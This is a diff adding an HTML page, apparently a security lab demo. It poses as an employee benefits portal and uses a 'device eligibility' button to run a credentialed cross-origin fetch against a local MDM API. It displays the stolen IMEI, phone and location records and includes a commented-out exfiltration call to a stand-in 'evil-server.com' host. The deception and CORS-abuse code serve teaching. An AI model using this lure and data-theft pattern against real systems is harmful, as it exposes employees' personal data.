@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Employee Benefits Portal - Device Stipend Program</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body {
+            background: #f5f7fa;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            color: #2c3e50;
+        }
+        
+        .benefits-container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            overflow: hidden;
+            margin: 2rem auto;
+            max-width: 1000px;
+            border: 1px solid #e1e8ed;
+        }
+        
+        .header-section {
+            background: #34495e;
+            color: white;
+            padding: 2rem;
+            text-align: center;
+            border-bottom: 3px solid #2c3e50;
+        }
+        
+        .benefit-card {
+            background: #ffffff;
+            border-radius: 6px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            border: 1px solid #ddd;
+            transition: all 0.2s ease;
+            cursor: pointer;
+        }
+        
+        .benefit-card:hover {
+            border-color: #95a5a6;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        
+        .benefit-icon {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            color: #7f8c8d;
+        }
+        
+        .device-stipend-card {
+            background: #ecf0f1;
+            border: 2px solid #3498db;
+            color: #2c3e50;
+        }
+        
+        .device-stipend-card:hover {
+            background: #dfe6e9;
+            border-color: #2980b9;
+        }
+        
+        .device-stipend-card .benefit-icon {
+            color: #3498db;
+        }
+        
+        .btn-check-eligibility {
+            background: #3498db;
+            border: none;
+            border-radius: 4px;
+            padding: 0.75rem 1.5rem;
+            font-weight: 500;
+            transition: all 0.2s ease;
+            color: white;
+        }
+        
+        .btn-check-eligibility:hover {
+            background: #2980b9;
+            color: white;
+        }
+        
+        .fake-company-logo {
+            width: 40px;
+            height: 40px;
+            background: white;
+            border-radius: 4px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1rem;
+            font-size: 1.2rem;
+            color: #34495e;
+            border: 1px solid #bdc3c7;
+        }
+        
+        .status-message {
+            display: none;
+            background: #dcfce7;
+            border: 1px solid #bbf7d0;
+            color: #166534;
+            padding: 1rem;
+            border-radius: 8px;
+            margin-top: 1rem;
+        }
+        
+        .loading-spinner {
+            display: none;
+        }
+        
+        .stolen-data-preview {
+            display: none;
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            color: #991b1b;
+            padding: 1rem;
+            border-radius: 8px;
+            margin-top: 1rem;
+            font-family: 'Courier New', monospace;
+            font-size: 0.875rem;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .attack-success {
+            background: #fee2e2;
+            border: 1px solid #fca5a5;
+            color: #dc2626;
+            padding: 1rem;
+            border-radius: 8px;
+            margin-top: 1rem;
+            display: none;
+        }
+        
+        .footer-disclaimer {
+            background: #ecf0f1;
+            padding: 1rem;
+            text-align: center;
+            font-size: 0.875rem;
+            color: #7f8c8d;
+            border-top: 1px solid #bdc3c7;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="benefits-container">
+            <!-- Header -->
+            <div class="header-section">
+                <div class="fake-company-logo">
+                    <i class="fas fa-building"></i>
+                </div>
+                <h1>� Employee Benefits Portal</h1>
+                <p class="mb-0">Corporate Benefits Management System</p>
+            </div>
+
+            <!-- Main Content -->
+            <div class="p-4">
+                <div class="row">
+                    <div class="col-md-12 mb-4">
+                        <div class="alert alert-info">
+                            <h6><i class="fas fa-info-circle"></i> Device Stipend Program - 2024</h6>
+                            <p class="mb-0">Our company is committed to supporting remote work. Eligible employees may receive reimbursement for work-related device expenses.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <!-- Health Benefits -->
+                    <div class="col-md-6">
+                        <div class="benefit-card">
+                            <div class="text-center">
+                                <div class="benefit-icon">
+                                    <i class="fas fa-heartbeat"></i>
+                                </div>
+                                <h4>Health Insurance</h4>
+                                <p class="text-muted">Comprehensive medical, dental, and vision coverage for you and your family.</p>
+                                <button class="btn btn-outline-primary disabled">Coming Soon</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Retirement -->
+                    <div class="col-md-6">
+                        <div class="benefit-card">
+                            <div class="text-center">
+                                <div class="benefit-icon">
+                                    <i class="fas fa-piggy-bank"></i>
+                                </div>
+                                <h4>Retirement Plan</h4>
+                                <p class="text-muted">401(k) with company matching up to 6% of your salary.</p>
+                                <button class="btn btn-outline-primary disabled">Coming Soon</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Device Stipend - The Evil One -->
+                    <div class="col-md-12">
+                        <div class="benefit-card device-stipend-card">
+                            <div class="text-center">
+                                <div class="benefit-icon">
+                                    <i class="fas fa-mobile-alt"></i>
+                                </div>
+                                <h3>📱 Device Stipend Program</h3>
+                                <p class="mb-3">Get reimbursed for your work devices! Eligible employees can receive up to $500 annually for smartphones, tablets, and laptops used for work.</p>
+                                
+                                <div class="row">
+                                    <div class="col-md-4">
+                                        <h6>📱 Smartphones</h6>
+                                        <p class="small">Up to $200/year</p>
+                                    </div>
+                                    <div class="col-md-4">
+                                        <h6>💻 Laptops</h6>
+                                        <p class="small">Up to $300/year</p>
+                                    </div>
+                                    <div class="col-md-4">
+                                        <h6>🎧 Accessories</h6>
+                                        <p class="small">Up to $100/year</p>
+                                    </div>
+                                </div>
+
+                                <button class="btn btn-check-eligibility btn-warning" id="checkEligibilityBtn" onclick="checkDeviceEligibility()">
+                                    <i class="fas fa-search"></i> Check My Device Eligibility
+                                </button>
+
+                                <!-- Loading State -->
+                                <div class="loading-spinner mt-3" id="loadingSpinner">
+                                    <div class="d-flex justify-content-center">
+                                        <div class="spinner-border text-warning" role="status">
+                                            <span class="visually-hidden">Processing...</span>
+                                        </div>
+                                    </div>
+                                    <p class="mt-2">Analyzing your device eligibility...</p>
+                                </div>
+
+                                <!-- Status Messages -->
+                                <div class="status-message" id="statusMessage">
+                                    <h6><i class="fas fa-check-circle"></i> Eligibility Check Complete!</h6>
+                                    <p class="mb-0">Great news! You're eligible for the full $500 annual device stipend. Your eligibility has been processed and you should receive information about next steps via email within 24 hours.</p>
+                                </div>
+
+                                <!-- Attack Success (shown in vulnerable mode) -->
+                                <div class="attack-success" id="attackSuccess">
+                                    <h6><i class="fas fa-exclamation-triangle"></i> CORS Attack Successful!</h6>
+                                    <p>🎯 <strong>Device data successfully stolen!</strong> The CORS vulnerability allowed this evil site to access sensitive device information from the MDM system using your authenticated session.</p>
+                                    <p class="mb-0"><strong>Data extracted:</strong> <span id="deviceCount">0</span> devices including IMEI numbers, phone numbers, locations, and personal information.</p>
+                                </div>
+
+                                <!-- Stolen Data Preview -->
+                                <div class="stolen-data-preview" id="stolenDataPreview">
+                                    <h6>🕵️ Stolen Device Data Sample:</h6>
+                                    <div id="stolenDataContent"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Other Benefits -->
+                    <div class="col-md-6">
+                        <div class="benefit-card">
+                            <div class="text-center">
+                                <div class="benefit-icon">
+                                    <i class="fas fa-umbrella-beach"></i>
+                                </div>
+                                <h4>Time Off</h4>
+                                <p class="text-muted">Generous PTO policy with 15 days vacation, 10 sick days, and 12 holidays.</p>
+                                <button class="btn btn-outline-primary disabled">Coming Soon</button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="col-md-6">
+                        <div class="benefit-card">
+                            <div class="text-center">
+                                <div class="benefit-icon">
+                                    <i class="fas fa-graduation-cap"></i>
+                                </div>
+                                <h4>Learning & Development</h4>
+                                <p class="text-muted">$2,000 annual education allowance for courses, conferences, and certifications.</p>
+                                <button class="btn btn-outline-primary disabled">Coming Soon</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Footer -->
+            <div class="footer-disclaimer">
+                <p class="mb-0">
+                    <i class="fas fa-shield-alt"></i> 
+                    Benefits Portal v2.1 | Secure Employee Access | 
+                    <a href="#">Privacy Policy</a> | 
+                    <a href="#">Terms of Service</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        let stolenDeviceData = [];
+
+        async function checkDeviceEligibility() {
+            // Clear any previous messages first
+            document.getElementById('statusMessage').style.display = 'none';
+            document.getElementById('attackSuccess').style.display = 'none';
+            document.getElementById('stolenDataPreview').style.display = 'none';
+            
+            // Clear any educational alerts from previous attempts
+            const existingAlerts = document.querySelectorAll('#statusMessage .alert');
+            existingAlerts.forEach(alert => alert.remove());
+            
+            // Show loading state
+            document.getElementById('checkEligibilityBtn').disabled = true;
+            document.getElementById('loadingSpinner').style.display = 'block';
+            
+            try {
+                // Attempt to steal device data via CORS vulnerability
+                console.log('🎯 Attempting CORS attack on MDM device API...');
+                
+                // Detect the current MDM URL (works for both localhost and 127.0.0.1)
+                const mdmUrl = window.location.protocol + '//' + window.location.hostname + ':5000';
+                
+                console.log('🎯 Attempting CORS attack...');
+                console.log('Target URL:', mdmUrl + '/cors/api/devices/detailed');
+                console.log('Attack Origin:', window.location.origin);
+                
+                const response = await fetch(mdmUrl + '/cors/api/devices/detailed', {
+                    method: 'GET',
+                    credentials: 'include',  // Include cookies for authentication
+                    headers: {
+                        'Content-Type': 'application/json'
+                    }
+                });
+
+                if (response.ok) {
+                    const deviceData = await response.json();
+                    stolenDeviceData = deviceData;
+                    
+                    console.log('🚨 CORS Attack Successful! Response received.');
+                    console.log('Response headers:', response.headers);
+                    console.log('Stolen device data count:', deviceData.length);
+                    
+                    // Show attack success
+                    setTimeout(() => {
+                        document.getElementById('loadingSpinner').style.display = 'none';
+                        document.getElementById('attackSuccess').style.display = 'block';
+                        document.getElementById('deviceCount').textContent = deviceData.length;
+                        
+                        // Show sample of stolen data
+                        displayStolenDataSample(deviceData);
+                        
+                        // Also show the "normal" success message to maintain cover
+                        setTimeout(() => {
+                            document.getElementById('statusMessage').style.display = 'block';
+                        }, 2000);
+                        
+                        // Re-enable button for additional attempts
+                        document.getElementById('checkEligibilityBtn').disabled = false;
+                    }, 2000);
+
+                    // Send stolen data to evil server (simulated)
+                    await exfiltrateData(deviceData);
+                    
+                } else {
+                    console.log('❌ Request failed with status:', response.status);
+                    console.log('Response headers:', response.headers);
+                    throw new Error(`Request failed: ${response.status}`);
+                }
+                
+            } catch (error) {
+                console.log('❌ CORS Attack Failed:', error.message);
+                console.log('Full error:', error);
+                
+                // Check if it's a CORS error
+                if (error.name === 'TypeError' && error.message.includes('fetch')) {
+                    console.log('🛡️ This appears to be a CORS error - protection is working!');
+                }
+                
+                // Show normal success message (user doesn't know attack failed)
+                setTimeout(() => {
+                    document.getElementById('loadingSpinner').style.display = 'none';
+                    document.getElementById('statusMessage').style.display = 'block';
+                    
+                    // Show educational message about CORS protection
+                    const educationalAlert = document.createElement('div');
+                    educationalAlert.className = 'alert alert-success mt-3';
+                    educationalAlert.innerHTML = `
+                        <h6><i class="fas fa-shield-alt"></i> CORS Protection Active!</h6>
+                        <p class="mb-0">🛡️ The browser blocked this cross-origin request due to proper CORS headers. 
+                        The MDM system's API is protected from data theft because CORS protection is enabled.</p>
+                    `;
+                    document.getElementById('statusMessage').appendChild(educationalAlert);
+                }, 2000);
+                
+                document.getElementById('checkEligibilityBtn').disabled = false;
+            }
+        }
+
+        function displayStolenDataSample(deviceData) {
+            const sampleData = deviceData.slice(0, 3); // Show first 3 devices
+            let html = '<strong>Sample of ' + deviceData.length + ' stolen device records:</strong><br><br>';
+            
+            sampleData.forEach(device => {
+                html += `<strong>${device.employee}</strong> (${device.department})<br>`;
+                html += `📱 Device: ${device.device_type}<br>`;
+                html += `📞 Phone: ${device.phone_number}<br>`;
+                html += `🔢 IMEI: ${device.imei}<br>`;
+                html += `📍 Location: ${device.location}<br>`;
+                html += `💾 Apps: ${device.installed_apps.join(', ')}<br>`;
+                html += `⚠️ Issues: ${device.compliance_violations.join(', ')}<br><br>`;
+            });
+            
+            html += `<em>... and ${deviceData.length - 3} more device records with complete personal and technical data.</em>`;
+            
+            document.getElementById('stolenDataContent').innerHTML = html;
+            document.getElementById('stolenDataPreview').style.display = 'block';
+        }
+
+        async function exfiltrateData(deviceData) {
+            // Simulate sending stolen data to evil server
+            console.log('📤 Exfiltrating stolen device data to evil server...');
+            
+            try {
+                // In a real attack, this would send data to attacker's server
+                const exfilData = {
+                    attack_timestamp: new Date().toISOString(),
+                    victim_origin: 'http://localhost:5000',
+                    stolen_records: deviceData.length,
+                    sample_data: deviceData.slice(0, 5), // Send sample
+                    attack_method: 'CORS misconfiguration',
+                    data_types: ['imei', 'phone_numbers', 'locations', 'personal_info', 'compliance_data']
+                };
+                
+                // Simulated evil server endpoint (this would be real in an actual attack)
+                // await fetch('https://evil-server.com/collect-stolen-data', {
+                //     method: 'POST',
+                //     headers: { 'Content-Type': 'application/json' },
+                //     body: JSON.stringify(exfilData)
+                // });
+                
+                console.log('💀 Data exfiltration complete:', exfilData);
+                
+            } catch (error) {
+                console.log('Exfiltration failed:', error);
+            }
+        }
+
+        // Educational console messages
+        console.log('%c🎯 Evil Benefits Portal Loaded', 'color: red; font-size: 16px; font-weight: bold;');
+        console.log('%cThis is a demonstration of a CORS vulnerability.', 'color: orange;');
+        console.log('%cWhen you click "Check Device Eligibility", this site will attempt to:', 'color: blue;');
+        console.log('%c1. Make a cross-origin request to the MDM API', 'color: blue;');
+        console.log('%c2. Steal sensitive device data using your authenticated session', 'color: blue;');
+        console.log('%c3. Exfiltrate the data to an attacker-controlled server', 'color: blue;');
+        console.log('%c', 'color: blue;');
+        console.log('%cIf CORS protection is disabled, the attack will succeed.', 'color: red;');
+        console.log('%cIf CORS protection is enabled, the browser will block the response.', 'color: green;');
+    </script>
+</body>
+</html>
